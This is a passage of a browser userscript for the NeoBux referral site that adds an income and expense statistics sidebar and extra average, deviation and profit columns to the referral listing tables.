        infoLabel.style.width = "182px";
        infoLabel.style.marginLeft = "5px";
        var sidebarStyle = document.createElement("style");
        sidebarStyle.innerHTML =
                "span.sidebarContent" +
                "{" +
                "  font-family: Verdana, sans-serif;" +
                "  font-size: x-small !important;" +
                "  text-align: left;" +
                "}" +
                "div.sidebarDetails" +
                "{" +
                "  font-size: 95%;" +
                "  margin-left: 5px;" +
                "}" +
                "h4" +
                "{" +
                "  color: #444;" +
                "  text-align: center;" +
                "  margin-top: 10px;" +
                "  margin-bottom:2px" +
                "}" +
                "h5" +
                "{" +
                "  margin-top: 7px;" +
                "  margin-bottom:2px" +
                "}" +
                "h6" +
                "{" +
                "  font-size: xx-small !important;" +
                "  margin-top: 2px;" +
                "  margin-bottom:2px" +
                "}" +
                ".bold" +
                "{" +
                "  font-weight: bold;" +
                "}" +
                ".grey" +
                "{" +
                "  color: #aaa;" +
                "}";
        infoLabel.innerHTML = (
                "<span class='sidebarContent'>" +
                "<span class='sidebarHeader'>" +
                "<h4 class='bold'>" + localString("statsSum") + "<br/>" +
                localString("totalReferrals") + " " + (numberOfRentedReferrals + numberOfDirectReferrals) + "</h4>" +
                "</span>" +
                "<h5 class='bold'><span class='grey'>[ " + localString("today") + " ]</span> - " + localString("net") + " : $" + fix(today.netIncome) + "</h5>" +
                "<hr width='170px' color='#CCCCCC'/>" +
                "<h6> - " + localString("income") + "</h6>" +
                "<div class='sidebarDetails'>" +
                "- " + localString("rented") + ": " + rentedClicks.today.toFixed(0) + " / $" + fix(rentedClicks.today * myAccount.rentedReferralClickValue) + "<br/>" +
                "- " + localString("direct") + ": " + directClicks.today.toFixed(0) + " / $" + fix(directClicks.today * myAccount.directReferralClickValue) + "<br/>" +
                "<i>" + localString("projectedIncome") + ":</i><br/>" +
                "- " + localString("rented") + ": " + today.projectedRentedClicks.toFixed(0) + " / $" + fix(today.projectedRentedClicks * myAccount.rentedReferralClickValue) + "<br/>" +
                "- " + localString("direct") + ": " + today.projectedDirectClicks.toFixed(0) + " / $" + fix(today.projectedDirectClicks * myAccount.directReferralClickValue) + "<br/>" +
                "</div>" +
                "<h6> - " + localString("expenses") + "</h6>" +
                "<div class='sidebarDetails'>" +
                "- " + localString("Recycle") + ": $" + fix(recycleCost.today) + "<br/>" +
                "- " + localString("autopay") + ": $" + fix(autopayCost.today) + "<br/>" +
                "- " + localString("renew") + ": $" + fix(renewalCost.today) + "<br/>" +
                "</div>" +
                "<h6> - " + localString("stats") + "</h6>" +
                "<div class='sidebarDetails'>" +
                (currentPage.language === "ES"
                ?
                "- " + localString("avg") + " " + localString("rented") + ": " + fix(today.rentedAverage) + "<br/>" +
                "- " + localString("avg") + " " + localString("direct") + ": " + fix(today.directAverage) + "<br/>"
                :
                "- " + localString("rented") + " " + localString("avg") + ": " + fix(today.rentedAverage) + "<br/>" +
                "- " + localString("direct") + " " + localString("avg") + ": " + fix(today.directAverage) + "<br/>"
                ) +
                "- " + localString("raverage") + ": " + fix(today.totalRAverage) + "<br/>" +
                (myAccount.accountType > 0 ? "- " + localString("automaticRecycling") + ": " + automaticRecycling.today.toFixed(0) + "<br/>" : "") +
                "</div>" +
                "<h6> - " + localString("totals") + "</h6>" +
                "<div class='sidebarDetails'>" +
                "- " + localString("income") + ": $" + fix(today.income) + "<br/>" +
                "- " + localString("expenses") + ": $" + fix(today.expenses) + "<br/>" +
                "- " + localString("net") + ": $" + fix(today.income - today.expenses) + "<br/>" +
                "- " + localString("projectedNet") + ": $" + fix(today.projectedIncome - today.expenses) + "<br/>" +
                "</div>" +
                "<h5 class='bold'><span class='grey'>[ " + localString("yesterday") + " ]</span> - " + localString("net") + " : $" + fix(yesterday.netIncome) + "</h5>" +
                "<hr width='170px' color='#CCCCCC'/>" +
                "<h6> - " + localString("income") + "</h6>" +
                "<div class='sidebarDetails'>" +
                "- " + localString("rented") + ": " + rentedClicks.yesterday.toFixed(0) + " / $" + fix(rentedClicks.yesterday * myAccount.rentedReferralClickValue) + "<br/>" +
                "- " + localString("direct") + ": " + directClicks.yesterday.toFixed(0) + " / $" + fix(directClicks.yesterday * myAccount.directReferralClickValue) + "<br/>" +
                "</div>" +
                "<h6> - " + localString("expenses") + "</h6>" +
                "<div class='sidebarDetails'>" +
                "- " + localString("Recycle") + ": $" + fix(recycleCost.yesterday)  + "<br/>" +
                "- " + localString("autopay") + ": $" + fix(autopayCost.yesterday)  + "<br/>" +
                "- " + localString("renew") + ": $" + fix(renewalCost.yesterday)  + "<br/>" +
                "</div>" +
                "<h6> - " + localString("stats") + "</h6>" +
                "<div class='sidebarDetails'>" +
                (currentPage.language === "ES"
                ?
                "- " + localString("avg") + " " + localString("rented") + ": " + fix(yesterday.rentedAverage)  + "<br/>" +
                "- " + localString("avg") + " " + localString("direct") + ": " + fix(yesterday.directAverage)  + "<br/>"
                :
                "- " + localString("rented") + " " + localString("avg") + ": " + fix(yesterday.rentedAverage)  + "<br/>" +
                "- " + localString("direct") + " " + localString("avg") + ": " + fix(yesterday.directAverage)  + "<br/>"
                ) +
                "- " + localString("raverage") + ": " + fix(yesterday.totalRAverage)  + "<br/>" +
                (myAccount.accountType > 0 ? "- " + localString("automaticRecycling") + ": " + automaticRecycling.yesterday.toFixed(0) + "<br/>" : "") +
                "</div>" +
                "<h6> - " + localString("totals") + "</h6>" +
                "<div class='sidebarDetails'>" +
                "- " + localString("income") + ": $" + fix(yesterday.income) + "<br/>" +
                "- " + localString("expenses") + ": $" + fix(yesterday.expenses) + "<br/>" +
                "- " + localString("net") + ": $" + fix(yesterday.income - yesterday.expenses) + "<br/>" +
                "</div>" +
                "<h5 class='bold'><span class='grey'>[" + localString("last") + " " + myAccount.preferences.timePeriod_recent + " " + localString("Days") + "]</span> - " + localString("net") + " : $" + fix(recent.netIncome[myAccount.preferences.timePeriod_recent]) + "</h5>" +
                "<hr width='170px' color='#CCCCCC'/>" +
                "<h6> - " + localString("income") + "</h6>" +
                "<div class='sidebarDetails'>" +
                "- " + localString("rented") + ": " + rentedClicks.recent.toFixed(0) + " / $" + fix(rentedClicks.recent * myAccount.rentedReferralClickValue) + "<br/>" +
                "- " + localString("direct") + ": " + directClicks.recent.toFixed(0) + " / $" + fix(directClicks.recent * myAccount.directReferralClickValue) + "<br/>" +
                "</div>" +
                "<h6> - " + localString("expenses") + "</h6>" +
                "<div class='sidebarDetails'>" +
                "- " + localString("Recycle") + ": $" + fix(recycleCost.recent)  + "<br/>" +
                "- " + localString("autopay") + ": $" + fix(autopayCost.recent)  + "<br/>" +
                "- " + localString("renew") + ": $" + fix(renewalCost.recent)  + "<br/>" +
                "</div>" +
                "<h6> - " + localString("stats") + "</h6>" +
                "<div class='sidebarDetails'>" +
                (currentPage.language === "ES"
                ?
                "- " + localString("avg") + " " + localString("rented") + ": " + fix(recent.rentedAverage)  + "<br/>" +
                "- " + localString("avg") + " " + localString("direct") + ": " + fix(recent.directAverage)  + "<br/>"
                :
                "- " + localString("rented") + " " + localString("avg") + ": " + fix(recent.rentedAverage)  + "<br/>" +
                "- " + localString("direct") + " " + localString("avg") + ": " + fix(recent.directAverage)  + "<br/>"
                ) +
                "- " + localString("raverage") + ": " + fix(recent.totalRAverage)  + "<br/>" +
                (myAccount.accountType > 0 ? "- " + localString("automaticRecycling") + ": " + automaticRecycling.recent.toFixed(0) + "<br/>" : "") +
                "</div>" +
                "<h6> - " + localString("totals") + "</h6>" +
                "<div class='sidebarDetails'>" +
                "- " + localString("income") + ": $" + fix(recent.income) + "<br/>" +
                "- " + localString("expenses") + ": $" + fix(recent.expenses) + "<br/>" +
                "- " + localString("net") + ": $" + fix(recent.income - recent.expenses) + "<br/>" +
                "</div>" +
                "</span>");
        infoLabel.appendChild(sidebarStyle);
// *** INSERT STATISTICS SUMMARY INTO PAGE ***
        locationToInsert.appendChild(spacer);
        locationToInsert.appendChild(infoLabel);
// Enlarge the width of the page to accomodate the extra column and add a little padding to make it look nicer
        locationToInsert.parentNode.parentNode.parentNode.setAttribute("width", "927");
        var nodesSnapshot = selectNodes("//body/div[contains(@style,'margin')][not(@id='tiptip_holder')]");
        nodesSnapshot[nodesSnapshot.length - 1].setAttribute("align", "center");
        var i;
        for (i = 0; i < nodesSnapshot.length; i += 1) {
            nodesSnapshot[i].style.width = "100%";
            if (i === nodesSnapshot.length - 1) {
                nodesSnapshot[i].children[2].style.width = "1100px";
            } else {
                nodesSnapshot[i].children[0].style.width = "1100px";
            }
        }
    }

    function setHeaderProperties(header) {
        header.setAttribute("class", "bgt");
        header.style.setProperty("font-family", "Arial,Helvetica,Verdana,sans-serif", "");
        header.style.setProperty("white-space", "nowrap", "");
        header.style.setProperty("text-align", "left", "");
    }

    function setFieldProperties(field) {
        field.setAttribute("class", "f_r cl");
        field.style.setProperty("white-space", "nowrap", "");
        field.style.setProperty("text-align", "right", "");
    }

    function shrinkContents(column) {
        column.style.setProperty("letter-spacing", myAccount.preferences.letterSpacing, "");
        column.style.setProperty("word-spacing", myAccount.preferences.wordSpacing, "");
    }

    function referralPage() {
// Function that runs on the Referral Listings pages
        var renewalPeriod = 0;
        var renewalCost = 0;
        var renewalCostPerRefPerDay = 0;
        var goldenFeePerRefPerDay = 0;
        var goldenPackFeePerRefPerDay = 0;
        var expensesPerRefPerDay = 0;
        var minBreakEvenAvgExcludingRecycles = 0;
        var sortArrowTable;
        var sortArrowDisplayStyles = new Array(7);
        var i;
        for (i = 0; i < 7; i += 1) {
            sortArrowTable = document.getElementById("sort_" + (i + 1));
            if (sortArrowTable) {
                sortArrowDisplayStyles[i] = sortArrowTable.style.display;
                sortArrowTable.style.display = "";
            }
        }
        if (currentPage.name === "rentedRefListing") {
// Define the column indexes
            var col_NUMBER = 0;
            var col_FLAG = 1;
            var col_NAME = 2;
            var col_SINCE = 3;
            var col_NEXTPAYMENT = 4;
            var col_LAST = 5;
            var col_CLICKS = 6;
            var col_AVG = 7;
            var colHeader_NAME = 1;
            var colHeader_SINCE = 2;
            var colHeader_NEXTPAYMENT = 3;
            var colHeader_LAST = 4;
            var colHeader_CLICKS = 5;        
            var colHeader_AVG = 6;
// CALCULATE REFERRAL EXPENSES PER DAY AND MIN BREAK EVEN AVERAGE
            renewalPeriod = myAccount.preferences.renewalPeriod;
            renewalCost = myAccount.renewalFee(renewalPeriod); // Cost of renewing for the renewing period
// Cost of renewing, per ref per day
            renewalCostPerRefPerDay = renewalCost / renewalPeriod;
            if (myAccount.accountType > 0) {
// Cost of golden & golden packs per ref, per day
                goldenFeePerRefPerDay = (90 / 365) / numberOfRentedReferrals;
                goldenPackFeePerRefPerDay = (myAccount.goldenPackCost / 365) / numberOfRentedReferrals;
            }
// Calculate how much referrals cost per day
            expensesPerRefPerDay = renewalCostPerRefPerDay + goldenFeePerRefPerDay + goldenPackFeePerRefPerDay;
// Calculate the minimum average needed to pay for the expenses of each ref each day
            minBreakEvenAvgExcludingRecycles = expensesPerRefPerDay / myAccount.rentedReferralClickValue;
        } else if (currentPage.name === "directRefListing") {
// Define the column indexes
            var col_NUMBER = 0;
            var col_NAME = 1;
            var col_CAME_FROM = 2;
            var col_SINCE = 3;
            var col_LAST = 4;
            var col_CLICKS = 5;
            var col_AVG = 6;
            var colHeader_NAME = 1;
            var colHeader_CAME_FROM = 2;
            var colHeader_SINCE = 3;
            var colHeader_LAST = 4;
            var colHeader_CLICKS = 5;
            var colHeader_AVG = 6;
        } else {
            GM.log("Error defining column indexes - currentPage.name is unknown.");
        }
        var sumOfAverages = 0;
        var sumOfMinigraphClickAvgs = 0;
        var clickSum = 0;
        var refCount = -1;
        var todayClickers = 0;
        var ydayClickers = 0;
        var zeroClickers = 0;
        var otherClickers = 0;
        var currencySymbol_AVG = myAccount.preferences.columnPrefix_Average;
        var currencySymbol_clickText = myAccount.ultimatePreferences.columnPrefix_clickText;
        var currencySymbol_average1 = myAccount.ultimatePreferences.columnPrefix_Average1;
        var currencySymbol_average2 = myAccount.ultimatePreferences.columnPrefix_Average2;
        var currencySymbol_RSA = myAccount.ultimatePreferences.columnPrefix_RSA;
        var currencySymbol_SD = myAccount.ultimatePreferences.columnPrefix_SD;
        var currencySymbol_Profit = myAccount.preferences.columnPrefix_Profit;
        var minigraphs = [];
// mainTable = the table which shows the referrals are contained
        var mainTable = selectNode("//td[@class='bgt']/ancestor::tbody[1]");
        if (mainTable === null) {
            return;
        }
        var rows = mainTable.rows;
        var headerRow = rows[0];
        var lastHeader = headerRow.childNodes[colHeader_AVG + 1];
        if (myAccount.preferences.referralName_shrinkContents) {
            shrinkContents(headerRow.childNodes[colHeader_NAME]);
        }
        if (myAccount.preferences.ownedSince_shrinkContents) {
            shrinkContents(headerRow.childNodes[colHeader_SINCE]);
        }
        if (currentPage.name === "directRefListing" &&
                myAccount.preferences.cameFrom_shrinkContents) {
            shrinkContents(headerRow.childNodes[colHeader_CAME_FROM]);
        }
        if (currentPage.name === "rentedRefListing" &&
                myAccount.preferences.nextPayment_shrinkContents) {
            shrinkContents(headerRow.childNodes[colHeader_NEXTPAYMENT]);
        }
        if (myAccount.preferences.lastClick_shrinkContents) {
            shrinkContents(headerRow.childNodes[colHeader_LAST]);
        }
        if (myAccount.preferences.totalClicks_shrinkContents) {
            shrinkContents(headerRow.childNodes[colHeader_CLICKS]);
        }
        if (myAccount.preferences.exactAverage_show) {
            setHeaderProperties(headerRow.childNodes[colHeader_AVG]);
            headerRow.childNodes[colHeader_AVG].childNodes[0].
                    childNodes[0].childNodes[0].childNodes[0].
                    childNodes[0].textContent +=
                    myAccount.preferences.exactAverage_seperator +
                    "Exact Avg.";
        }
        if (myAccount.preferences.average_shrinkContents) {
            shrinkContents(headerRow.childNodes[colHeader_AVG]);
        }
// Ultimate-only columns
        if (myAccount.accountType === 6) {
// clickText column === A textual representation of the data in the mini click graphs
            if (myAccount.ultimatePreferences.showColumn_clickText === true) {
                var new_clickText = document.createElement("td");
                setHeaderProperties(new_clickText);
                new_clickText.innerHTML = "Clicks/day";
                headerRow.insertBefore(new_clickText, lastHeader);
                if (myAccount.ultimatePreferences.clickText_shrinkContents) {
                    shrinkContents(new_clickText);
                }
            }
// 'average1' column === Average for the last 10 days
            if (myAccount.ultimatePreferences.showColumn_Average1 === true) {
                var new_headerAvg_10 = document.createElement("td");
                setHeaderProperties(new_headerAvg_10);
                new_headerAvg_10.innerHTML = "A" + myAccount.ultimatePreferences.timePeriod_average1;
                headerRow.insertBefore(new_headerAvg_10, lastHeader);
                if (myAccount.ultimatePreferences.average1_shrinkContents) {
                    shrinkContents(new_headerAvg_10);
                }
            }
// 'average2' column === Average for the last 7 days
            if (myAccount.ultimatePreferences.showColumn_Average2 === true) {
                var new_headerAvg_7 = document.createElement("td");
                setHeaderProperties(new_headerAvg_7);
                new_headerAvg_7.innerHTML = "A" + myAccount.ultimatePreferences.timePeriod_average2;
                headerRow.insertBefore(new_headerAvg_7, lastHeader);
                if (myAccount.ultimatePreferences.average2_shrinkContents) {
                    shrinkContents(new_headerAvg_7);
                }
            }
// 'SDEV' column === Standard Deviation
            if (myAccount.ultimatePreferences.showSDEVColumn === true) {
                var new_headerSDEV = document.createElement("td");
                setHeaderProperties(new_headerSDEV);
                new_headerSDEV.innerHTML = "SD";
                headerRow.insertBefore(new_headerSDEV, lastHeader);
                if (myAccount.ultimatePreferences.SD_shrinkContents) {
                    shrinkContents(new_headerSDEV);
                }
            }
// 'RSA' column === Ratio of standard deviation / average (mean)
            if (myAccount.ultimatePreferences.showColumn_RSA === true) {
                var new_headerRSA = document.createElement("td");
                setHeaderProperties(new_headerRSA);
                new_headerRSA.innerHTML = "RSA";
                headerRow.insertBefore(new_headerRSA, lastHeader);
                if (myAccount.ultimatePreferences.RSA_shrinkContents) {
                    shrinkContents(new_headerRSA);
                }
            }
        }
// 'Profit' column can be viewed by all members
        if (myAccount.preferences.showColumn_Profit === true) {
            var new_headerPROFIT = document.createElement("td");
            setHeaderProperties(new_headerPROFIT);
            new_headerPROFIT.innerHTML = "Profit";
            headerRow.insertBefore(new_headerPROFIT, lastHeader);
            if (myAccount.preferences.profitColumn_shrinkContents) {
                shrinkContents(new_headerPROFIT);
            }
        }
// Fetch the script that contains referral listing data
        var xpathResults_mtx = selectNode("//script[contains(.,'mtx=')]");
// Fetch the useful part of the script and replace the '];' that got removed by split()
        var mtxCode = xpathResults_mtx.innerHTML.split("];")[0] + "];";
        mtxCode = mtxCode.replace(/([0-9]+\.*[0-9]*)([,|\]])/g, "'$1'$2");
        customLogger("xpathResults_mtx = " + xpathResults_mtx + "\n" +
                "mtxCode = " + mtxCode, 7);
// Run the code in mtxCode (var mtx=[...];)
        eval(mtxCode);
// Ultimate-only columns
        if (myAccount.accountType === 6) {
// mtx.length = # of referrals shown on current page
            for (var z = 0; z < mtx.length; z += 1) {
                var clickData = mtx[z][14].toString();
                var clickData_array = [];
                customLogger("clickData = " + clickData, 7);
// Make the minigraph data more useable by splitting it into an array
                if (clickData !== "0") {
                    clickData.split("");
                    for (i = 0; i < clickData.length; i += 1) {
                        clickData_array[i] = parseInt(clickData[i], 10);
                    }
                } else {
                    clickData_array = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
                }
// Now reverse the order of the array so that the most recent days are first ([0] == today, [1] == yesterday)
                clickData_array.reverse();
                customLogger("typeof clickData_array = " + typeof clickData_array + "\n" +
                        "clickData_array = " + clickData_array, 7);
// Extract the stats from the minigraph data
                var minigraphClickData = [];
                var minigraphClickSums = [];
                var minigraphClickAvgs = [];
                for (var m = 0; m < clickData_array.length; m += 1) {
                    minigraphClickData[m] = parseInt(clickData_array[m], 10);
                }
                for (var s = 0; s < minigraphClickData.length; s += 1) {
                    if (s === 0) {
                        minigraphClickSums[s] = minigraphClickData[s];
                    } else {
                        minigraphClickSums[s] = minigraphClickSums[s - 1] + minigraphClickData[s];
                    }
                    minigraphClickAvgs[s] = minigraphClickSums[s] / (s + 1);
                    customLogger("s = " + s + "\n" +
                            "minigraphClickData[s] = " + minigraphClickData[s] + "\n" +
                            "minigraphClickSums[s - 1] = " + minigraphClickSums[s - 1] + "\n" +
                            "minigraphClickSums[s] = " + minigraphClickSums[s] + "\n" +
                            "minigraphClickAvgs[s] = " + minigraphClickAvgs[s], 12);
                }
                minigraphs[z] = new graphProperties(minigraphClickData, minigraphClickSums);
            }
        }
// Loop through the displayed referrals
        for (var rowCounter = 1; rowCounter < (rows.length - 1); rowCounter += 1) {
            var currentRow = rows[rowCounter];
// If the row isn't blank, process it
            if (currentRow.textContent !== "" && currentRow.childNodes.length > 1) {
                refCount += 1;
                customLogger("rowCounter = " + rowCounter + "\n" +
                        "currentRow = " + currentRow + "\n" +
                        "refCount = " + refCount, 7);
                var lastColumn = currentRow.childNodes[col_AVG + 1];
                var refFlag = currentRow.childNodes[col_FLAG];
                var refName = currentRow.childNodes[col_NAME];
                var refOwnedSince = currentRow.childNodes[col_SINCE];
                if (currentPage.name === "rentedRefListing") {
                    var refNextPayment = currentRow.childNodes[col_NEXTPAYMENT];
                }
                var refLastClick = currentRow.childNodes[col_LAST];
                var refTotalClicks = currentRow.childNodes[col_CLICKS];
                var refOverallAvg = currentRow.childNodes[col_AVG];
                if (currentPage.name === "rentedRefListing" &&
                        myAccount.preferences.flag_shrinkContents) {
                    shrinkContents(refFlag);
                }
                if (myAccount.preferences.referralNumber_shrinkContents) {
                    shrinkContents(currentRow.childNodes[col_NUMBER]);
                }
                if (myAccount.preferences.referralName_shrinkContents) {
                    shrinkContents(refName);
                }
                if (myAccount.preferences.ownedSince_shrinkContents) {
                    shrinkContents(refOwnedSince);
                }
                if (currentPage.name === "rentedRefListing" &&
                        myAccount.preferences.nextPayment_shrinkContents) {
                    shrinkContents(refNextPayment);
                }
                if (myAccount.preferences.lastClick_shrinkContents) {
                    shrinkContents(refLastClick);
                }
                if (myAccount.preferences.totalClicks_shrinkContents) {
                    shrinkContents(refTotalClicks);
                }
                if (myAccount.preferences.average_shrinkContents) {
                    shrinkContents(refOverallAvg);
                }
// Columns specific to the direct referrals page
                if (currentPage.name === "directRefListing" &&
                        myAccount.preferences.cameFrom_shrinkContents) {
                    shrinkContents(currentRow.childNodes[col_CAME_FROM]);
                }
                if (myAccount.preferences.textifyFlag && 
                        currentPage.name === "rentedRefListing") {
// Get the flag colour of the referral
                    var flagColour;
                    if (refFlag.innerHTML.indexOf("flag0.gif") > -1) {
                        flagColour = localString("W");
                    } else if (refFlag.innerHTML.indexOf("flag1.gif") > -1) {
                        flagColour = localString("R");
                    } else if (refFlag.innerHTML.indexOf("flag2.gif") > -1) {
                        flagColour = localString("O");
                    } else if (refFlag.innerHTML.indexOf("flag3.gif") > -1) {
                        flagColour = localString("Y");
                    } else if (refFlag.innerHTML.indexOf("flag4.gif") > -1) {
                        flagColour = localString("G");
                    } else if (refFlag.innerHTML.indexOf("flag5.gif") > -1) {
                        flagColour = localString("Bl");
                    } else if (refFlag.innerHTML.indexOf("flag6.gif") > -1) {
                        flagColour = localString("P");
                    } else if (refFlag.innerHTML.indexOf("flag7.gif") > -1) {
                        flagColour = localString("Bk");
                    }
                    refFlag.style.whiteSpace = "nowrap";
                    refFlag.innerHTML += myAccount.preferences.textifyFlag_prefix + flagColour;
                }
// Extract the 'wholeDays' data from the table
                var numDaysOwned_raw = refOwnedSince.innerHTML.replace("&nbsp;", "");
                var lastClick_raw = refLastClick.innerHTML.replace("&nbsp;", "");
// Calculate the number of days referral has been owned and convert this to a 'fuller' version [x days, y hours, z mins]
// If {column}_shortFormat === true, it will return [x d, y h, z m] instead
// If 'fullerSinceTimers' is set to false, NumDaysSince() will return only the whole number of days that have passed
                var numDaysOwned_summarised = NumDaysSince(numDaysOwned_raw, "mins", myAccount.preferences.referralSince_fullerTimers, myAccount.preferences.ownedSinceTimer_shortFormat);
// If the referral has not clicked yet, the referral has been inactive for as long as it has been owned
// Else the referral has been inactive since the date of its last click
                if (lastClick_raw.match(neobuxString("noClicks"))) {
                    var inactiveDays = NumDaysSince(numDaysOwned_raw, "days", myAccount.preferences.lastClick_fullerTimers, myAccount.preferences.lastClickTimer_shortFormat);
                    var accurateLastClick = NumDaysSince(numDaysOwned_raw, "decimal", myAccount.preferences.lastClick_fullerTimers, myAccount.preferences.lastClick_fullerTimers);
                } else  {
                    var inactiveDays = NumDaysSince(lastClick_raw , "days", myAccount.preferences.lastClick_fullerTimers, myAccount.preferences.lastClickTimer_shortFormat);
                    var accurateLastClick = NumDaysSince(lastClick_raw, "decimal", myAccount.preferences.lastClick_fullerTimers, myAccount.preferences.lastClick_fullerTimers);
                }
// Insert the summarised date / 'time elapsed' to the cell
// If user preference is to not replace the whole cell, append to end of existing cell contents, else replace the cell contents
// 'Owned Since' column
                if (myAccount.preferences.referralSince_numerise) {
                    if (!myAccount.preferences.referralSince_replace) {
                        refOwnedSince.innerHTML = numDaysOwned_raw + "<small style='color: #666666;'> (" + numDaysOwned_summarised + ")</small>";
                    } else {
                        refOwnedSince.innerHTML = numDaysOwned_summarised;
                    }
                }
// 'Last Click' column
                if (myAccount.preferences.lastClick_numerise) {
                    if (myAccount.preferences.lastClick_replace || (myAccount.preferences.lastClick_replaceNilClicks && parseInt(refTotalClicks.textContent, 10) === 0)) {
                        refLastClick.innerHTML = inactiveDays;
                    } else {
                        refLastClick.innerHTML = lastClick_raw + "<small style='color: #666666;'> [" + inactiveDays + "]</small>";
                    }
                }
// Avg. column
                var accurateOwnedSince = NumDaysSince(numDaysOwned_raw, 'decimal', myAccount.preferences.referralSince_fullerTimers, false);
                var accurateAverage = parseInt(refTotalClicks.textContent, 10) / accurateOwnedSince;
                if (myAccount.preferences.exactAverage_show) {
// Replace the displayed average (accurate to a 24hour period) with one that that is more accurate
// (takes hours and minutes into account)
                    if (myAccount.preferences.exactAverage_replace) {
                        refOverallAvg.innerHTML = fix(accurateAverage);
                    } else {
                        refOverallAvg.innerHTML = refOverallAvg.innerHTML + "<span style='color: #666666;'>" + myAccount.preferences.exactAverage_seperator + fix(accurateAverage) + "</span>";
                    }
                }
                refOverallAvg.innerHTML = currencySymbol_AVG + "" + refOverallAvg.innerHTML; // + "" + is necessary to ensure that the vars are concatenated (as opposed to mathematical addition)
// Update the overall statistics for the single page of referrals (data used for bar at bottom of the referral listing page)
                if (parseFloat(refOverallAvg.textContent) > 0) {
                    sumOfAverages += parseFloat(refOverallAvg.textContent);
                    if (myAccount.accountType === 6) {
                        sumOfMinigraphClickAvgs += minigraphs[refCount].mean[myAccount.ultimatePreferences.minigraphAvgInterval];
                    }
                    clickSum += parseInt(refTotalClicks.textContent, 10);
                }
// Keep a tally of how many referrals clicked today / yesterday / never / other
                if (parseInt(refTotalClicks.textContent, 10) === 0) {
                    zeroClickers += 1;
                } else if (Math.floor(accurateLastClick) === 0) {
                    todayClickers += 1;
                } else if (Math.floor(accurateLastClick) === 1) {
                    ydayClickers += 1;
                } else {
                    otherClickers += 1;
                }
// INSERT EXTRA COLUMNS
// Ultimate-only columns
                if (myAccount.accountType === 6) {
// clickText column === A textual representation of the data in the mini click graphs
                    if (myAccount.ultimatePreferences.showColumn_clickText === true) {
                        var columnText_clickText = minigraphs[refCount].value[minigraphs[refCount].value.length - 1].toFixed(0);
                        for (i = minigraphs[refCount].value.length - 2; i > 0; i -= 1) {
                            columnText_clickText += "|" + minigraphs[refCount].value[i].toFixed(0);
                        }
                        var newColumn_clickText = document.createElement("td");
                        setFieldProperties(newColumn_clickText);
                        newColumn_clickText.innerHTML = currencySymbol_clickText + columnText_clickText;
                        if (myAccount.ultimatePreferences.clickText_shrinkContents) {
                            shrinkContents(newColumn_clickText);
                        }
                        currentRow.insertBefore(newColumn_clickText, lastColumn);
                    }
// 'average1' column === Average for the last timePeriod_average1 days
                    if (myAccount.ultimatePreferences.showColumn_Average1 === true) {
                        var columnText_average1 = fix(minigraphs[refCount].mean[myAccount.ultimatePreferences.timePeriod_average1]);
                        var newColumn_average1 = document.createElement("td");
                        setFieldProperties(newColumn_average1);
                        newColumn_average1.innerHTML = currencySymbol_average1 + columnText_average1;
                        if (myAccount.ultimatePreferences.average1_shrinkContents) {
                            shrinkContents(newColumn_average1);
                        }
                        currentRow.insertBefore(newColumn_average1, lastColumn);
                    }
// 'average2' column === Average for the last timePeriod_average2 days
                    if (myAccount.ultimatePreferences.showColumn_Average2 === true) {
                        var columnText_average2 = fix(minigraphs[refCount].mean[myAccount.ultimatePreferences.timePeriod_average2]);
                        var newColumn_average2 = document.createElement("td");
                        setFieldProperties(newColumn_average2);
                        newColumn_average2.innerHTML = currencySymbol_average2 + columnText_average2;
                        if (myAccount.ultimatePreferences.average2_shrinkContents) {
                            shrinkContents(newColumn_average2);
                        }
                        currentRow.insertBefore(newColumn_average2, lastColumn);
                    }
// 'SDEV' column === Standard DEViation for the last 10 days
                    if (myAccount.ultimatePreferences.showSDEVColumn === true) {
                        var columnText_SDEV = fix(minigraphs[refCount].sdev);
                        var newColumn_SDEV = document.createElement("td");
                        setFieldProperties(newColumn_SDEV);
                        newColumn_SDEV.innerHTML = currencySymbol_SD + columnText_SDEV;
                        if (myAccount.ultimatePreferences.SD_shrinkContents) {
                            shrinkContents(newColumn_SDEV);
                        }
                        currentRow.insertBefore(newColumn_SDEV, lastColumn);
                    }
// 'RSA' column === Ratio of standard deviation / average (mean)
                    if (myAccount.ultimatePreferences.showColumn_RSA === true) {
                        var columnText_RSA = fix(minigraphs[refCount].sdev / minigraphs[refCount].mean[10]);
                        var newColumn_RSA = document.createElement("td");
                        setFieldProperties(newColumn_RSA);
                        newColumn_RSA.innerHTML = currencySymbol_RSA + columnText_RSA;
                        if (myAccount.ultimatePreferences.RSA_shrinkContents) {
                            shrinkContents(newColumn_RSA);
                        }
                        currentRow.insertBefore(newColumn_RSA, lastColumn);
                    }
                }
// 'Profit' column can be viewed by all members
                if (myAccount.preferences.showColumn_Profit) {
// Retrieve numerical version of numDaysOwned and other details about the current individual referral
                    var numDaysOwned_decimal = NumDaysSince(numDaysOwned_raw, "wholeDays", myAccount.preferences.lastClick_fullerTimers, false);
                    var refClicks = parseInt(refTotalClicks.innerHTML, 10);
                    var refID = refName.textContent.replace(/^\s*(\S*(\s+\S+)*)\s*$/, "$1");
                    var indivAvg = accurateAverage;
// Calculate the gross income and expenses for the referral (accurate to the minute)
                    var grossIn;
                    var grossOut;
                    if (currentPage.name === "rentedRefListing") {
                        grossIn = refClicks * myAccount.rentedReferralClickValue;
                        grossOut = numDaysOwned_decimal * expensesPerRefPerDay;
                    } else if (currentPage.name === "directRefListing") {
                        grossIn = refClicks * myAccount.directReferralClickValue;
                        grossOut = 0;
                    }
                    var netProfit_exclRecycles = grossIn - grossOut;
                    var netProfit_inclRecycles = (grossIn - grossOut) - myAccount.recycleCost;
                    customLogger("currentPage.name = " + currentPage.name + "\n" +
                            "numDaysOwned_decimal = " + numDaysOwned_decimal + "\n" +
                            "expensesPerRefPerDay = " + expensesPerRefPerDay + "\n" +
                            "grossOut = " + grossOut + "\n" +
                            "grossIn = " + grossIn + "\n" +
                            "myAccount.recycleCost = " + myAccount.recycleCost + "\n" +
                            "netProfit_exclRecycles = " + netProfit_exclRecycles + "\n" +
                            "netProfit_inclRecycles = " + netProfit_inclRecycles, 7);
// Calculate the net income of the individual referral slot
// If the user wishes to include the cost of recycling in the profit column, include the recycle fee 
// in the gross expenses for the referral
                    var PROFIT;
                    if (!myAccount.preferences.includeRecycleCostInProfitColumn || (currentPage.name === "directRefListing")) {
                        PROFIT = netProfit_exclRecycles;
                    } else {
                        PROFIT = netProfit_inclRecycles;
                    }
// Create the new 'Profit' column
                    var newColumn_PROFIT = document.createElement("td");
                    setFieldProperties(newColumn_PROFIT);
